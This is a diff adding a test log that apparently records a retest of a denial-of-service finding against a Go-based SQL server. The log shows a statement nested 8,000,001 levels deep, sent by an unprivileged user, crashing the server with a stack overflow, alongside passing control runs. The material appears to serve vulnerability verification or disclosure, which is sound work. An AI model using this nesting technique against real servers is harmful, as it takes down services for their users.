@@ -1,0 +1,26 @@
+=== TIDB-NEST-01 E2E retest 2026-09-05T21:52:21-05:00 (server pid 1075367) ===
+--- [negative control 1] plain SELECT works, server alive ---
+1
+1
+--- [negative control 2] depth 3,000,001 succeeds, server stays alive ---
+depth3M_exit=0
+server alive after 3M
+--- exploit: depth 8,000,001 (40MB statement, zero-grant attacker) ---
+mysql_exit=1
+))))))))))))))))))))))))))))))))))))))))))))
+--------------
+
+ERROR 2013 (HY000) at line 1: Lost connection to server during query
+
+SERVER PROCESS DEAD
+status port REFUSED (service unavailable)
+--- fatal trace from server log ---
+fatal error: stack overflow
+
+runtime stack:
+runtime.throw({0x8245cca?, 0x200000001?})
+	/usr/lib/go-1.26/src/runtime/panic.go:1229 +0x48 fp=0x7fe4c4bb5cf0 sp=0x7fe4c4bb5cc0 pc=0x2944ec8
+runtime.newstack()
+	/usr/lib/go-1.26/src/runtime/stack.go:1178 +0x5fd fp=0x7fe4c4bb5e20 sp=0x7fe4c4bb5cf0 pc=0x292723d
+runtime.morestack()
+	/usr/lib/go-1.26/src/runtime/asm_amd64.s:681 +0x7d fp=0x7fe4c4bb5e28 sp=0x7fe4c4bb5e20 pc=0x294c7bd
